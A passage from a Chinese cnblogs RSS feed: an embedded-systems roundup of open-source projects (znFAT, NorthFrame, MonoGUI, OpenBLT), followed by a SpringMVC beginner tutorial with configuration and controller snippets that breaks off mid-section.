&lt;p&gt;&lt;strong&gt;你的点赞与分享是对我最大的支持&lt;/strong&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 08 Oct 2020 17:11:00 +0000</pubDate>
<dc:creator>crossoverJie</dc:creator>
<og:description>前言 这段时间在维护产品的搜索功能，每次在管理台看到 elasticsearch 这么高效的查询效率我都很好奇他是如何做到的。 这甚至比在我本地使用 MySQL 通过主键的查询速度还快。 为此我搜索了</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/crossoverJie/p/13783463.html</dc:identifier>
</item>
<item>
<title>《痞子衡嵌入式半月刊》 第 17 期 - 痞子衡</title>
<link>http://www.cnblogs.com/henjay724/p/13783225.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/henjay724/p/13783225.html</guid>
<description>&lt;p&gt;这里分享嵌入式领域有用有趣的项目/工具以及一些热点新闻，农历年分二十四节气，希望在每个交节之日准时发布一期。&lt;/p&gt;&lt;div id=&quot;cnblogs_post_body&quot; readability=&quot;116.05658609706&quot;&gt;

&lt;p&gt;&lt;img src=&quot;http://henjay724.com/image/cnblogs/pzh_mcu_bi_weekly.PNG&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里分享嵌入式领域有用有趣的项目/工具以及一些热点新闻，农历年分二十四节气，希望在每个交节之日准时发布一期。&lt;/p&gt;
&lt;p&gt;本期刊是开源项目（GitHub: &lt;a href=&quot;https://github.com/JayHeng/pzh-mcu-bi-weekly&quot;&gt;JayHeng/pzh-mcu-bi-weekly&lt;/a&gt;），欢迎提交 issue，投稿或推荐你知道的嵌入式那些事儿。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;上期回顾&lt;/strong&gt; ：&lt;a href=&quot;https://www.cnblogs.com/henjay724/p/13712975.html&quot;&gt;《痞子衡嵌入式半月刊： 第 16 期》&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;唠两句&quot;&gt;唠两句&lt;/h2&gt;
&lt;p&gt;今天是寒露。寒露是一个反映气候变化特征的节气，是凉爽向寒冷的转折。&lt;/p&gt;
&lt;p&gt;又是一年国庆中秋双节同庆8天长假，鉴于国外疫情情况，今年国内各大旅游胜地应该比往年要更加&quot;热闹&quot;，痞子衡不喜欢凑热闹，因此在家宅了8天，没有旅途奔波，倒是真正体验了个最轻松的长假。&lt;/p&gt;
&lt;p&gt;本期共收录 4个项目，希望对你有帮助！&lt;/p&gt;
&lt;h2 id=&quot;项目类&quot;&gt;项目类&lt;/h2&gt;
&lt;h3 id=&quot;1、znfat---国产嵌入式fat32文件系统解决方案&quot;&gt;&lt;span&gt;1、znFAT - 国产嵌入式FAT32文件系统解决方案&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;znFAT是大神于振南维护的一套高效、完备、精简且具有高可移植性的嵌入式FAT32文件系统解决方案。&lt;/p&gt;
&lt;blockquote readability=&quot;1.5555555555556&quot;&gt;
&lt;p&gt;项目主页: &lt;a href=&quot;https://gitee.com/dbembed/znfat&quot;&gt;https://gitee.com/dbembed/znfat&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;该项目的特性有：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-text&quot;&gt;- 与FAT32文件系统高度兼容，提供丰富文件操作函数，可实现文件与目录创建、打开、删除，数据的读取与写入等功能。
- 可方便地移植到多种嵌入式CPU平台上，如51、STM32、AVR、PIC、ColdFile、MSP430等。
- 占用RAM与ROM资源极少，并可由使用者视目标平台资源情况进行灵活配置，最小配置情况下，RAM的使用量约在800~900字节，最大配置下约为1300字节。
- 内建独特数据读写加速算法，以及多种工作模式，均可由用户自行配置，以满足不同的速度与功能需求。
- 创新性提出数据写入的实时工作模式，可保证写入到磁盘文件中的数据安全。防止因恶劣工作环境、干扰或其它原因引起的目标平台不可预见的死机或故障，造成数据丢失（实时模式数据写入速度不高，数据直接写入物理扇区，而不在RAM中暂存，并对文件数据进行实时维护）。
- 底层提供简单的单扇区读写驱动接口以及可选的硬件多扇区读、写、擦除驱动接口。（在提供硬件多扇区读、写、擦除驱动的情况下，磁盘格式化与数据读写速度将有近2~4倍的提升，甚至更高。）
- 提供清晰而强大的功能模块裁剪功能，可极大程度减小最终生成的可执行文件的体积，节省ROM资源。
- 提供数据读取重定向功能，使读到的数据无需缓冲暂存，直接流向应用目的。
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;znFAT作者还为该项目专门写了一本书：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://henjay724.com/image/biweekly/znFAT_book.PNG&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;2、northframe---一个单片机极简图形化状态机框架&quot;&gt;&lt;span&gt;2、NorthFrame - 一个单片机极简图形化状态机框架&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;NorthFrame是基于非UML极简理念的状态机框架，配合NF_FsmDesigner图形化开发工具，可无负担替代传统switch-case状态机开发。&lt;/p&gt;
&lt;blockquote readability=&quot;1.3725490196078&quot;&gt;
&lt;p&gt;项目主页: &lt;a href=&quot;https://gitee.com/PISCES_X/NorthFrame&quot;&gt;https://gitee.com/PISCES_X/NorthFrame&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;NorthFrame包含三个组件：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-text&quot;&gt;NF_FSM : 极简非UML状态机框架
NF_FsmDesigner : 基于C# Winform开发的状态机图形化开发工具，可直接生成C代码
NF_Signal : 用于代替全局变量的动态信号机制
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;http://henjay724.com/image/biweekly/NorthFrame.PNG&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;创建一个在VS2012环境中运行的判断QE组合键的状态机例程仅需如下三步：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-text&quot;&gt;Step1 : 使用NF_FsmDesigner工具设计绘制状态转换图，并保存为XML文件
Step2 : 点击生成代码，生成C语言代码
Step3 : 在main.c文件中实现按键处理，并发送事件给状态机
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;3、monogui---一个黑白图形用户接口系统&quot;&gt;&lt;span&gt;3、MonoGUI - 一个黑白图形用户接口系统&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;MonoGUI是针对电子词典、高级计算器、电子手表、标签打印机、收款机、电子货签等 具有黑白屏幕的小电子设备开发的专用GUI系统。本系统具有结构简单、使用容易、内 存占用小、单线程、处理器负担轻等特点。虽然图形能力仅有黑与白，但其支持完整的 中文显示处理功能（GB18030中2字节汉字，即旧GB13000标准），其Edit控件和中文输 入法（包括九键输入法）功能上达到Windows和Android的输入法水平，且扩展容易。&lt;/p&gt;
&lt;blockquote readability=&quot;1.4285714285714&quot;&gt;
&lt;p&gt;项目主页: &lt;a href=&quot;https://gitee.com/liuxinouc/MonoGUI&quot;&gt;https://gitee.com/liuxinouc/MonoGUI&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;MonoGUI使用纯C++编写，不依赖于第三方源码，便于移植和调试。配套的工具软件， 如图片转换器、对话框模板编辑器等，全部开源。设计资料完整，文档充实，也是一份 不可多得的研究资料。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://henjay724.com/image/biweekly/MonoGUI.PNG&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;4、openblt---功能资料比较全面的开源bootloader&quot;&gt;&lt;span&gt;4、OpenBLT - 功能资料比较全面的开源Bootloader&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;OpenBLT是一个开源引导加载程序，可以在任何微控制器上运行并使用任何类型的通信接口来执行软件更新，而无需专用的调试器硬件。&lt;/p&gt;
&lt;blockquote readability=&quot;1.4893617021277&quot;&gt;
&lt;p&gt;项目主页: &lt;a href=&quot;https://github.com/feaser/openblt&quot;&gt;https://github.com/feaser/openblt&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;http://henjay724.com/image/biweekly/OpenBLT.PNG&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;该项目的特点有：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-text&quot;&gt;- 用户友好的PC下载程序。
- 完整的源代码可用。
- 与STM32，XMC4，XCM1，Tricore，HCS12和其他基于ARM Cortex的微控制器一起使用。
- 易于移植到不同的微控制器。
- 支持常用的通讯接口，例如RS232，CAN，TCP / IP和USB。
- 支持从本地连接的存储设备（例如SD卡）进行软件更新。
- 可扩展以支持额外的存储器，例如串行EEPROM或外部闪存。
- 可扩展以支持用户定义的后门条目。
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;欢迎订阅&quot;&gt;欢迎订阅&lt;/h3&gt;
&lt;p&gt;文章会同时发布到我的 &lt;a href=&quot;https://www.cnblogs.com/henjay724/&quot;&gt;博客园主页&lt;/a&gt;、&lt;a href=&quot;https://blog.csdn.net/henjay724&quot;&gt;CSDN主页&lt;/a&gt;、&lt;a href=&quot;https://www.zhihu.com/people/henjay724&quot;&gt;知乎主页&lt;/a&gt;、&lt;a href=&quot;http://weixin.sogou.com/weixin?type=1&amp;amp;query=%E7%97%9E%E5%AD%90%E8%A1%A1%E5%B5%8C%E5%85%A5%E5%BC%8F&quot;&gt;微信公众号&lt;/a&gt; 平台上。&lt;/p&gt;
&lt;p&gt;微信搜索&quot;&lt;strong&gt;痞子衡嵌入式&lt;/strong&gt;&quot;或者扫描下面二维码，就可以在手机上第一时间看了哦。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://henjay724.com/image/github/pzhMcu_qrcode_258x258.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/div&gt;</description>
<pubDate>Thu, 08 Oct 2020 15:06:00 +0000</pubDate>
<dc:creator>痞子衡</dc:creator>
<og:description>这里分享嵌入式领域有用有趣的项目/工具以及一些热点新闻，农历年分二十四节气，希望在每个交节之日准时发布一期。</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/henjay724/p/13783225.html</dc:identifier>
</item>
<item>
<title>SpringMVC系列之SpringMVC快速入门  MVC设计模式介绍+什么是SpringMVC+ SpringMVC的作用及其基本使用+组件解析+注解解析 - 一只胡说八道的猴子</title>
<link>http://www.cnblogs.com/pjhaymy/p/13782927.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/pjhaymy/p/13782927.html</guid>
<description>&lt;h2 id=&quot;spring-mvc&quot;&gt;Spring-mvc&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201008203133742.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BqaDg4,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;什么是springmvc&quot;&gt;什么是SpringMvc&lt;/h2&gt;
&lt;p&gt;SpringMvc是一种基于java的实现Mvc设计模式的请求驱动类型的轻量级web框架，属于SpringFrameWork的后续产品，已经融合在Spring Web Flow中&lt;br/&gt;SpringMvc已经成为目前最主流的MVC框架之一，并且随着Spring3.0的发布，全面超越Struts2，成为最优秀的mvc框架，他通过一套注解，让一个简单的java类成为处理请求的控制器，他无需实现任何接口，同时他还支持RESTful编程风格的请求&lt;/p&gt;
&lt;h2 id=&quot;mvc设计模式介绍&quot;&gt;Mvc设计模式介绍&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;MVC&lt;/strong&gt;：Model（模块） View（视图） Controller（控制器） 是一种设计模式，是一种业务逻辑，数据与界面显示分离开来的方法来组织代码，将众多业务逻辑整合到一个部件里，在需要改进和个性化定制界面及用户交互的同时，不需要重新编写业务逻辑，达到减少编码的时间，提高代码复用性。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;模块层（Model）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;封装了数据与进行数据进行处理的代码，是实际经行数据处理的地方，也是与数据库交互的地方&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;视图层（View）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;负责将应用显示给用户和显示模型的状态&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;控制层（controller）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;f负责视图和模型之间的交互，控制对用户输入的响应，响应方式和流程，他主要负责两个方面，&lt;br/&gt;&lt;strong&gt;一&lt;/strong&gt;：把用户的请求发送到对应的模型上&lt;br/&gt;&lt;strong&gt;二&lt;/strong&gt;：把模型的改变及时反应到视图上&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;V即View视图：&lt;/strong&gt;&lt;br/&gt;是指用户看到并与之交互的界面。比如由html元素组成的网页界面，或者软件的客户端界面。MVC的好处之一在于它能为应用程序处理很多不同的视图。在视图中其实没有真正的处理发生，它只是作为一种输出数据并允许用户操纵的方式。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;M即model模型：&lt;/strong&gt;&lt;br/&gt;是指模型表示业务规则。在MVC的三个部件中，模型拥有最多的处理任务。被模型返回的数据是中立的，模型与数据格式无关，这样一个模型能为多个视图提供数据，由于应用于模型的代码只需写一次就可以被多个视图重用，所以减少了代码的重复性。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C即controller控制器：&lt;/strong&gt;&lt;br/&gt;是指控制器接受用户的输入并调用模型和视图去完成用户的需求，控制器本身不输出任何东西和做任何处理。它只是接收请求并决定调用哪个模型构件去处理请求，然后再确定用哪个视图来显示返回的数据。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;图片解析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201008205927318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BqaDg4,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;最典型的mvc就是jspservletjavabean模式。&quot;&gt;最典型的MVC就是jsp+servlet+javabean模式。&lt;/h2&gt;
&lt;p&gt;JavaBean作为模型，既可以作为数据模型来封装业务数据，又可以作为业务逻辑模型来包含应用的业务操作。其中，数据模型用来存储或传递业务数据，而业务逻辑模型接收到控制器传过来的模型更新请求后，执行特定的业务逻辑处理，然后返回相应的执行结果。&lt;/p&gt;
&lt;p&gt;JSP作为视图层，负责提供页面为用户展示数据，提供相应的表单（Form）来用于用户的请求，并在适当的时候（点击按钮）向控制器发出请求来请求模型进行更新。&lt;/p&gt;
&lt;p&gt;Serlvet作为控制器，用来接收用户提交的请求，然后获取请求中的数据，将之转换为业务模型需要的数据模型，然后调用业务模型相应的业务方法进行更新，同时根据业务执行结果来选择要返回的视图。&lt;/p&gt;
&lt;p&gt;基本流程图&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201008210143333.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BqaDg4,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;下面我们用一个案例来演示jspservletjavabean&quot;&gt;下面我们用一个案例来演示jsp+servlet+javabean&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;步骤&lt;/strong&gt;&lt;br/&gt;1.导入SpringMVC相关坐标&lt;br/&gt;2.配置SpringMVC核心控制器DispathcerServlet&lt;br/&gt;3.创建Controller类和视图页面&lt;br/&gt;4.使用注解配置Controller类中业务方法的映射地址&lt;br/&gt;5.配置SpringMVC核心文件 spring-mvc.xml&lt;br/&gt;6.客户端发起请求测试&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.导入SpringMVC相关坐标&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;&amp;lt;dependency&amp;gt;
            &amp;lt;groupId&amp;gt;org.springframework&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;spring-webmvc&amp;lt;/artifactId&amp;gt;
            &amp;lt;version&amp;gt;5.0.4.RELEASE&amp;lt;/version&amp;gt;
        &amp;lt;/dependency&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;2.配置SpringMVC核心控制器DispathcerServlet&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt; &amp;lt;servlet&amp;gt;
        &amp;lt;servlet-name&amp;gt;DispatcherServlet&amp;lt;/servlet-name&amp;gt;
        &amp;lt;servlet-class&amp;gt;org.springframework.web.servlet.DispatcherServlet&amp;lt;/servlet-class&amp;gt;
       &amp;lt;!--加载配置文件的代码--&amp;gt;
        &amp;lt;init-param&amp;gt;
            &amp;lt;param-name&amp;gt;contextConfigLocation&amp;lt;/param-name&amp;gt;
            &amp;lt;param-value&amp;gt;classpath:spring-mvc.xml&amp;lt;/param-value&amp;gt;
        &amp;lt;/init-param&amp;gt;
        &amp;lt;!--在服务器启动的时候就加载servlet--&amp;gt;
        &amp;lt;load-on-startup&amp;gt;1&amp;lt;/load-on-startup&amp;gt;
    &amp;lt;/servlet&amp;gt;
    &amp;lt;servlet-mapping&amp;gt;
        &amp;lt;servlet-name&amp;gt;DispatcherServlet&amp;lt;/servlet-name&amp;gt;
        &amp;lt;!--在访问任何资源的时候都要走servlet--&amp;gt;
        &amp;lt;url-pattern&amp;gt;/&amp;lt;/url-pattern&amp;gt;
    &amp;lt;/servlet-mapping&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;3.创建Controller类和视图页面&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这里编写一个简单的controller类，用于跳转到一个success.jsp页面&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;并使用注解配置Controller类中业务方法的映射地址&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;package com.pjh.controller;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
@Controller
public class controller {
    @RequestMapping(&quot;/quick&quot;)
    public String save(){
        System.out.println(&quot;Controller save running！！&quot;);
        return &quot;success.jsp&quot;;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;index.jsp页面代码&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;&amp;lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;title&amp;gt;Title&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;H1&amp;gt;Success&amp;lt;/H1&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;4.配置SpringMVC核心文件 spring-mvc.xml&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;这里只是配置了一个简单的扫描器&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt; &amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;
       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd

http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd
&quot;&amp;gt;
        &amp;lt;!--配置扫描器,这是controller层专用的配置文件，实现了放分离--&amp;gt;
    &amp;lt;context:component-scan base-package=&quot;com.pjh.controller&quot;/&amp;gt;
&amp;lt;/beans&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;结果&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201008151721804.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BqaDg4,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;流程图解析&quot;&gt;流程图解析&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201008152649967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BqaDg4,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201008152239976.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BqaDg4,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;springmvc的执行流程图&quot;&gt;SpringMVC的执行流程图&lt;/h2&gt;
&lt;p&gt;1.用户发送请求至前端控制器DispatcherServlet。&lt;br/&gt;2.DispatcherServlet收到请求调用HandlerMapping处理器映射器。&lt;br/&gt;3.处理器映射器找到具体的处理器(可以根据xml配置、注解进行查找)，生成处理器对象及处理器拦截器(如果有则生成)一并返回给4.DispatcherServlet。&lt;br/&gt;5.DispatcherServlet调用HandlerAdapter处理器适配器。&lt;br/&gt;6.HandlerAdapter经过适配调用具体的处理器(Controller，也叫后端控制器)。&lt;br/&gt;7.Controller执行完成返回ModelAndView。&lt;br/&gt;8.HandlerAdapter将controller执行结果ModelAndView返回给DispatcherServlet。&lt;br/&gt;9.DispatcherServlet将ModelAndView传给ViewReslover（视图解析器）。&lt;br/&gt;10.ViewReslover解析后返回具体View。&lt;br/&gt;11.DispatcherServlet根据View进行渲染视图（即将模型数据填充至视图中）。DispatcherServlet响应用户。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;图解&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201008210730464.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BqaDg4,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;加粗样式&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;springmvc组件解析&quot;&gt;SpringMVC组件解析&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1.前端控制器：DispatcherServlet&lt;/strong&gt;&lt;br/&gt;用户请求到达前端控制器，这就是MVC设计模式中的C（Controller），是整个流程的控制中心，由他调用组件来处理用户的请求， Dispatcher的存在大大降低了组件之间的耦合性&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 处理器映射器：HandlerMapping&lt;/strong&gt;&lt;br/&gt;HandlerMapping 负责根据用户请求找到 Handler 即处理器，SpringMVC 提供了不同的映射器实现不同的&lt;br/&gt;映射方式，例如：配置文件方式，实现接口方式，注解方式等。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 处理器适配器：HandlerAdapter&lt;/strong&gt;&lt;br/&gt;通过 HandlerAdapter 对处理器进行执行，这是适配器模式的应用，通过扩展适配器可以对更多类型的处理&lt;br/&gt;器进行执行&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. 处理器：Handler&lt;/strong&gt;&lt;br/&gt;它就是我们开发中要编写的具体业务控制器。由 DispatcherServlet 把用户请求转发到 Handler。由&lt;br/&gt;Handler 对具体的用户请求进行处理。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 视图解析器：View Resolver&lt;/strong&gt;&lt;br/&gt;View Resolver 负责将处理结果生成 View 视图，View Resolver 首先根据逻辑视图名解析成物理视图名，即具体的页面地址，再生成 View 视图对象，最后对 View 进行渲染将处理结果通过页面展示给用户。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 视图：View&lt;/strong&gt;&lt;br/&gt;SpringMVC 框架提供了很多的 View 视图类型的支持，包括：jstlView、freemarkerView、pdfView等。最常用的视图就是 jsp。一般情况下需要通过页面标签或页面模版技术将模型数据通过页面展示给用户，需要由程序员根据业务需求开发具体的页面&lt;/p&gt;
&lt;h2 id=&quot;springmvc注解解析&quot;&gt;SpringMVC注解解析&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;@RequestMapping&lt;/strong&gt;&lt;br/&gt;作用：用于建立请求 URL 和处理请求方法之间的对应关系&lt;br/&gt;位置：&lt;br/&gt;类上，请求URL 的第一级访问目录。此处不写的话，就相当于应用的根目录&lt;br/&gt;方法上，请求 URL 的第二级访问目录，与类上的使用@ReqquestMapping标注的一级目录一起组成访问虚拟路径&lt;br/&gt;属性：&lt;br/&gt;value：用于指定请求的URL。它和path属性的作用是一样的&lt;br/&gt;method：用于指定请求的方式&lt;br/&gt;params：用于指定限制请求参数的条件。它支持简单的表达式。要求请求参数的key和value必须和配置的一模一样&lt;br/&gt;例如：&lt;br/&gt;params = {&quot;accountName&quot;}，表示请求参数必须有accountName&lt;br/&gt;params = {&quot;moeny!100&quot;}，表示请求参数中money不能是100&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;示例&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Controller
@RequestMapping(&quot;/user&quot;)
public class Usercontroller {
    /*跳转到指定的页面，用来代替web.xml配置*/
    @RequestMapping(value = &quot;/quick&quot;,method= RequestMethod.POST,params = {&quot;username&quot;})
    public String save(){
        System.out.println(&quot;Controller save running！！&quot;);
        return &quot;success.jsp&quot;;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;访问路径&lt;/strong&gt;：&lt;a href=&quot;http://lcalhost&quot;&gt;http://lcalhost&lt;/a&gt;:端口号/user/quick?username=xxx&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;请求方法必须为&lt;/strong&gt;：Post&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;必须带请求参数&lt;/strong&gt;：username&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;spring命名空间引入&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;命名空间：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;xmlns:context=&quot;http://www.springframework.org/schema/context&quot;
xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;1.约束地址&lt;/strong&gt;：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;     http://www.springframework.org/schema/context
     http://www.springframework.org/schema/context/spring-context.xsd
     http://www.springframework.org/schema/mvc 
     http://www.springframework.org/schema/mvc/spring-mvc.xsd
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;2. 组件扫描&lt;/strong&gt;&lt;br/&gt;SpringMVC基于Spring容器，所以在进行SpringMVC操作时，需要将Controller存储到Spring容器中，如果使用@Controller注解标注的话，就需要使用&amp;lt;context:component-scan base-package=“com.itheima.controller&quot;/&amp;gt;进行组件扫描。&lt;/p&gt;
&lt;h2 id=&quot;视图解析器的配置&quot;&gt;视图解析器的配置&lt;/h2&gt;
&lt;p&gt;SpringMVC有默认组件配置，默认组件都是DispatcherServlet.properties配置文件中配置的，该配置文件地址org/springframework/web/servlet/DispatcherServlet.properties，该文件中配置了默认的视图解析器，如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;org.springframework.web.servlet.ViewResolver=org.springframework.web.servlet.view.InternalResourceViewResolver
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;翻看该解析器源码，可以看到该解析器的默认设置，如下&lt;/strong&gt;：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;REDIRECT_URL_PREFIX = &quot;redirect:&quot;  --重定向前缀
FORWARD_URL_PREFIX = &quot;forward:&quot;    --转发前缀（默认值）
prefix = &quot;&quot;;     --视图名称前缀
suffix = &quot;&quot;;     --视图名称后缀
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;视图解析器&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;我们可以通过属性注入的方式修改视图的的前后缀&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
